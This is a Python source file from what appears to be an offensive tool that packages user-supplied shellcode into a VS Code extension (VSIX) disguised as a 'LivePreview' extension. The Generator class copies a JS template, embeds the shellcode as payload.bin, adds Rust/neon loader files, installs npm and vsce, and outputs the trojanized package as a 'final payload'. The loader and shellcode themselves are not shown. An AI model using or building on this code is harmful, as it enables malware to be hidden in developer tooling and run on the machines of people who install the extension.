"""
Contains the class responsible for building things
"""
import os
import sys
import shutil
import datetime
from pathlib import Path
from tempfile import TemporaryDirectory

from src.extensions.livepreview import LivePreview
from src.misc import *


class Generator:
    def __init__(self, ext, shellcode, enc):
        self.ext = None
        self.shellcode = shellcode
        # self.inflate = inflate 
        self.enc = enc
        self._tmp = TemporaryDirectory(delete=False)
        self.tmp = self._tmp.name
        # print("[+] Temporary build directory:\t\t"+self.tmp)

        _ext = ext.lower()
        if _ext == "livepreview":
            self.ext = LivePreview()

    def check_prerequisites(self):
        """Check files"""
        if os.name != 'nt':
            print("[-] This program can only be run on WINDOWS (for now)")
            sys.exit(-1)

        _v = ["npm", "cargo", "node"]
        for _p in _v:
            s = shutil.which(_p)
            if s:
                print(f"[+] {_p} found in:\t\t\t{s}")
            else:
                print(f"[-] Did not find required program:\t{_p}")
                sys.exit(-1)
    
    def template_files(self):
        """template files for compilation"""

        # First copy vs files into temp directory 
        copy_dir_contents(self.ext.template_path, self.tmp)
        print("[+] Template JS copied to:\t\t" + self.tmp) 

        # Copy shellcode file
        temp_shellcode = os.path.join(self.tmp, "src", "payload.bin")
        shutil.copyfile(self.shellcode, temp_shellcode)
        print("[+] Shellcode copied to:\t\t"+temp_shellcode) 

        # Copy rust files 
        rust_files = ["Cargo.toml", "Cargo.lock", os.path.join("src", "lib.rs")]
        for r in rust_files:
            _s = os.path.join(os.getcwd(), "templates", "rust", r)
            _d = os.path.join(self.tmp, r)
            shutil.copy2(_s, _d)
            print("[+] Copied rust files to:\t\t" + _d) 

    def install_dependencies(self):
        """install required dependencies"""
        cw = os.getcwd()
        _neon_rs = os.path.join(self.tmp, "node_modules", ".bin", "neon")
        print("[+] Installing dependencies")

        try:
            os.chdir(self.tmp)
            
            # Install neon-rs
            run_cmd_check_file("npm install", [_neon_rs])

            if not shutil.which("vsce"):
                print("[*] Could not locate vsce")
                _so, _se, _rc = run_cmd("npm install -g vsce")
                if _rc != 0:
                    print("[-] Failed to install vsce")
                    if _so:
                        print(f"[-] STDOUT:\b{_so}")
                    if _se:
                        print(f"[-] STDOUT:\b{_se}")
                    sys.exit(-1)

        except FileNotFoundError as e:
            print(f"[-] Exception occured as:\t{e}")
            os.chdir(cw)
            sys.exit(-1)
            
        os.chdir(cw)

    def compile(self):
        """Compile files"""
        cw = os.getcwd()
        vsix = os.path.join(self.tmp, self.ext.vsix)
        try:
            print("[+] Compiling your payload")
            os.chdir(self.tmp)
            run_cmd_check_file("vsce package --no-yarn", [vsix])
            print("[+] Successfully produced VSIX package:\t"+vsix)

        except FileNotFoundError as e:
            print(f"[-] Failed to produce target vsce:\t{vsix}")
            pass

        tgt_vsix = os.path.join(
            os.getcwd(), 
            "output", 
            f"{datetime.datetime.now().strftime('%Y_%m_%dT_%H_%M_%S')}_{self.ext.vsix}")
        shutil.copy2(vsix, tgt_vsix)
        print(f"[+] Final payload available at:\t{tgt_vsix}")
        os.chdir(cw)
    